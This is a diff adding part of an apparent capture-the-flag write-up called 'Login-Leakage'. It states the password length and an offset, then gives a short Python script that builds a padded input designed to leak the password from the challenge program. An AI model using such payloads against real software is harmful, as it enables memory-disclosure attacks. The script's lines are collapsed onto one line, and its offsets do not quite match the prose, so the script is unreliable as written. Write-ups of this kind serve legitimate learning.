@@ -10,4 +10,9 @@ inspecting the data at address 0x7fffd7707545
 
 ![img/Login-Leakage-1778680709898.webp](img/Login-Leakage-1778680709898.webp)
 
-we found that the password is 9 bytes long, and the program told us that
+we found that the password is 9 bytes long, and the program told us that the distance betweern our input and the password is about 0x5d5
+now we just need to write a script
+
+```
+#!/usr/bin/python3 import sys p1 = 0x5de payload = b"A"*0x9 payload += b"\x00" payload += b"A"*0x5D4 sys.stdout.buffer.write(str(p1).encode() + b"\n" + payload + b"\n")
+```
